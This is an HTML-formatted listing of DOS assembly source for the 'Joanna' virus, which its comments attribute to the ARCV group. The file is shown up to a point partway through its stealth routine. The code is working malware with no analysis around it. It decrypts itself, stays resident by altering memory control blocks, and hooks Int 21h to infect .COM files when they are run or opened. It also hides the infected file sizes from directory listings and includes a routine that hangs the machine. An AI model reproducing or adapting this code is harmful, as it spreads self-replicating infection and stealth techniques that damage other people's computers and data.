<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>JO1_11.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">        </span><span class="sc9">NAME</span><span class="sc0"> </span><span class="sc6">Jo</span><span class="sc0">
        </span><span class="sc9">PAGE</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
        </span><span class="sc9">TITLE</span><span class="sc0"> </span><span class="sc6">Jo</span><span class="sc0"> </span><span class="sc5">Virus.</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is Yet another virus from the ARCV, this one is called</span><span class="sc0">
</span><span class="sc1">; Joanna, it was written by Apache Warrior, ARCV President.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It has Stealth features, it is a Resident infector of .COM files</span><span class="sc0">
</span><span class="sc1">; and uses the Cybertech Mutation Engine (TM) by Apache Warrior for </span><span class="sc0">
</span><span class="sc1">; its Polymorphic features.  There is a maximum of 3 unchanged bytes</span><span class="sc0">
</span><span class="sc1">; in the Encrypted code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">

                </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

</span><span class="sc5">int_21ofs</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
</span><span class="sc5">int_21seg</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">86h</span><span class="sc0">
</span><span class="sc9">length</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc5">msglen</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldstart</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
</span><span class="sc5">tsrlen</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findat</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc4">)/</span><span class="sc2">10</span><span class="sc0">  
</span><span class="sc5">len</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">decryptlen</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main2</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">  

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main2</span><span class="sc0">             </span><span class="sc1">; SI offset for decrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">                   </span><span class="sc1">; viri decrypt size</span><span class="sc0">
</span><span class="sc5">loop_1</span><span class="sc4">:</span><span class="sc0">         
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">; decrypt</span><span class="sc0">
</span><span class="sc5">switch</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loop_1</span><span class="sc0">
</span><span class="sc5">main2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">findoff</span><span class="sc0">                    </span><span class="sc1">; find file ofset</span><span class="sc0">
</span><span class="sc5">findoff</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findoff</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff05h</span><span class="sc0">                   </span><span class="sc1">; Test for Scythe2 Boot</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                     </span><span class="sc1">; Check for Scythe2 Boot</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">haha</span><span class="sc0">                        </span><span class="sc1">; no go on</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                      </span><span class="sc1">; Display message</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg2</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                           </span><span class="sc1">; Crash the machine</span><span class="sc0">
</span><span class="sc5">haha</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                      </span><span class="sc1">; Date Test</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1210h</span><span class="sc0">                    </span><span class="sc1">; Is month the Oct.</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">main3</span><span class="sc0">                       </span><span class="sc1">; no go on</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                      </span><span class="sc1">; Display Message</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc5">main3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">; move old programs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">; start back to the start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldstart</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">inst</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffa4h</span><span class="sc0">                   </span><span class="sc1">; check to see if already instaled</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; bring back si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">42a1h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">oldprog</span><span class="sc0">                      </span><span class="sc1">; Yes return to old program</span><span class="sc0">

</span><span class="sc5">tt2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Residency Routine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; Get MCB segment Address</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Put MCB segment Address in es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">int_21ofs</span><span class="sc0">    </span><span class="sc1">; Load Int 21h address data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">int_21seg</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">int21</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Move Int 21h data to store</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">int21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">5ah</span><span class="sc0">         </span><span class="sc1">; Check for Start of MCB</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">oldprog</span><span class="sc0">                     </span><span class="sc1">; If no then quit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Play with MCB to get top of </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">                     </span><span class="sc1">; Memory and reserve 3,008 bytes</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">oldprog</span><span class="sc0">                     </span><span class="sc1">; for Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">0bch</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; Move Virus into Memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">; space allocated above</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; Stop Interrupts Very Inportant</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new21</span><span class="sc0">             </span><span class="sc1">; Load New Int 21h handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">int_21ofs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; address and store</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">int_21seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">oldprog</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">; Return to Orginal</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Program..</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                           </span><span class="sc1">; Storage For Int 21h Address</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   New interupt 21h Handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">sayitis</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">42a1h</span><span class="sc0">                    </span><span class="sc1">; Install Check..</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0"> 

</span><span class="sc5">new21</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;nop                            ; Sign byte </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffa4h</span><span class="sc0">                   </span><span class="sc1">; Instalation Check</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sayitis</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                      </span><span class="sc1">; FCB Search file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adjust_FCB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                      </span><span class="sc1">; FCB Search Again</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adjust_FCB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; Handle Search file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adjust_FCB</span><span class="sc0">    
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; Handle Search Again</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adjust_FCB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                      </span><span class="sc1">; Are they opening a file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">intgo</span><span class="sc0">                        </span><span class="sc1">; if no ignore</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                      </span><span class="sc1">; Exec Function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">noint</span><span class="sc0"> 
</span><span class="sc5">intgo</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; 4bh, 3dh Infect file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; Handler save the Registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">checkit</span><span class="sc0">                    </span><span class="sc1">; Call infect routine</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">noint</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Return to Orginal Int 21h</span><span class="sc0">

</span><span class="sc5">adjust_FCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; Stealth Routine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Check for handle Search</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">okFCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Set flag</span><span class="sc0">
</span><span class="sc5">okFCB</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; Get DTA Address</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Restore ax to orginal function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">; value call it</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; save flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; save ax error code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">adjust</span><span class="sc0">                     </span><span class="sc1">; Call stealth adjust routine</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; restore registers</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">; Return to caller</span><span class="sc0">

</span><span class="sc5">adjust</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Stealth check routine</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; Check flag set earlyer</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fcb1</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">repurn</span><span class="sc0">                       </span><span class="sc1">; Check for Handle Search error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; No error then carry on</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">                     </span><span class="sc1">; Check stealth stamp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">repurn</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc5">len</span><span class="sc0">    </span><span class="sc1">; Infected then take the viri size</span><span class="sc0">
